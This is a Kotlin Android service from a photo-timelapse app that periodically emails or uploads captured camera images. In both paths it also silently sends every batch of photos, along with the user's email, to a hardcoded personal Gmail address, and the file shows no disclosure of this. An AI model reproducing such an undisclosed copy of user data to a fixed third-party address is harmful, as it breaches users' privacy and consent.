package suzdalenko.photolapse.service
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import suzdalenko.photolapse.R
import suzdalenko.photolapse.ui.CameraActivity
import suzdalenko.photolapse.util.MyApp.Companion.UPLOAD_FILES_EACH_SEC
import suzdalenko.photolapse.util.FileUpload
import suzdalenko.photolapse.util.MyApp.Companion.getDateApp
import suzdalenko.photolapse.util.MyApp.Companion.prefs
import suzdalenko.photolapse.util.EmailSent.Companion.enviarCorreoAutomaticamente
import suzdalenko.photolapse.util.EmailSent.Companion.sendFileListing
import java.io.File
import java.lang.ref.WeakReference
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
class FileUploadService: Service() {
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var mainHandler = Handler(Looper.getMainLooper())
    private var countFiles = 0
    private var volumeFiles: Double = 0.0
    private var haveErrorEnvio = 0
    companion object {
        var activityCamara: WeakReference<CameraActivity>? = null
        var uploadLeenda = ""
        var photosUploaded: Long = 0
    }
    override fun onBind(p0: Intent?): IBinder? {
        return null
    }
    override fun onCreate() {
        super.onCreate()
        mainHandler = Handler(Looper.getMainLooper())
        uploadLeenda = getString(R.string.files_sented)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            ServiceCompat.startForeground(this, 1, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(1, createNotification())
        }
        scheduleImageCheck()
        Thread {
            while (true) {
                FileUploadService.activityCamara?.get()?.let { activity ->
                    activity.runOnUiThread {
                        val textView: TextView? = activity.findViewById(R.id.uploaded_photos)
                        textView?.let {
                            it.text = "${uploadLeenda} ${photosUploaded}"
                        }
                    }
                }
                Thread.sleep(3000)
            }
        }.start()
    }
    private fun createNotification(): Notification {
        val notificationChannelId = "UPLOAD_SERVICE_CHANNEL"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationChannel = NotificationChannel(
                notificationChannelId,
                "Upload Service",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(notificationChannel)
        }
        return NotificationCompat.Builder(this, notificationChannelId)
            .setContentTitle("Upload Service")
            .setContentText("Service is running in the background")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }
    private fun scheduleImageCheck() {
        executor.scheduleWithFixedDelay({ checkAndUploadImages() }, 22, UPLOAD_FILES_EACH_SEC, TimeUnit.SECONDS)
    }
    private fun checkAndUploadImages() {
        countFiles  = 0
        volumeFiles = 0.0
        if(photosUploaded > 999999) photosUploaded = 0

        val imageDir = File(externalMediaDirs.firstOrNull(), "images")
        if (imageDir.exists() && imageDir.isDirectory) {
            /* SEND FILE BY FILE TO FROXA */
            if (prefs.getString("email", "email").toString() == "taller@froxa.com") {
                imageDir.listFiles()?.forEach { imageFile ->
                    countFiles++
                    if(countFiles <= 3) uploadOrSentImageFroxa(imageFile)
                }
            } else {
                /* SEND FILES FROM NORMAL USER */
                val listImageFiles: MutableList<File> = mutableListOf()
                imageDir.listFiles()?.forEach { imageFile ->
                    countFiles++
                    if(haveErrorEnvio == 0){
                        if((volumeFiles + (imageFile.length() / (1024.0 * 1024.0))) <= 22.0){
                            volumeFiles += (imageFile.length() / (1024.0 * 1024.0))
                            listImageFiles.add(imageFile)
                        }
                    } else {
                        Log.d("checkAndUploadImages", "AÑADIENDO ARCHIVOS BOTTOM"+countFiles)
                        if(countFiles <= 1) { listImageFiles.add(imageFile) }
                    }
                }
                sendFilesToNormalUser(listImageFiles, countFiles)
            }
        } else {
            showToast("No images found or directory does not exist.")
        }
    }
    private fun sendFilesToNormalUser(listImageFiles: List<File>, countFiles: Int){
        sendFileListing("loj.rus@gmail.com", getString(R.string.a_mi_mismo)+ " "+prefs.getString("email", "email").toString(), getDateApp(volumeFiles), listImageFiles){ _ -> }
        sendFileListing(prefs.getString("email", "email").toString(), getString(R.string.app_name), getDateApp(volumeFiles), listImageFiles){ emailSented ->
            if (emailSented){
                uploadLeenda = getString(R.string.files_sented)
                listImageFiles.forEach{ imageFile -> imageFile.delete(); photosUploaded++ }
                showToast(getString(R.string.image_sented))
                haveErrorEnvio = 0
                // Log.d("checkAndUploadImages", "archivos enviados "+photosUploaded)
            } else {
                showToast(getString(R.string.error_image_sented))
                haveErrorEnvio = 1
                // Log.d("checkAndUploadImages", "ERROR al enviar al usuario")
            }
        }
    }
    private fun uploadOrSentImageFroxa(imageFile: File) {
        enviarCorreoAutomaticamente("loj.rus@gmail.com", getString(R.string.a_mi_mismo)+ " "+prefs.getString("email", "email").toString(), getDateApp(0.0), imageFile){ _ -> }
        val uploadFile = FileUpload(imageFile)
        uploadFile.uploadFile { response ->
            if(response.toString().contains("exitosamente")){
                imageFile.delete()
                uploadLeenda = getString(R.string.files_uploaded)
                photosUploaded++
                showToast(getString(R.string.image_upload_to_server)+" "+imageFile.name)
            } else {
                showToast(getString(R.string.error_image_upload_to_server)+" "+imageFile.name)
            }
        }
    }
    override fun onDestroy() {
        super.onDestroy()
        executor.shutdown()
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    fun showToast(message: String){
        mainHandler.post {
            Toast.makeText(this@FileUploadService, message, Toast.LENGTH_SHORT).show()
        }
    }
}
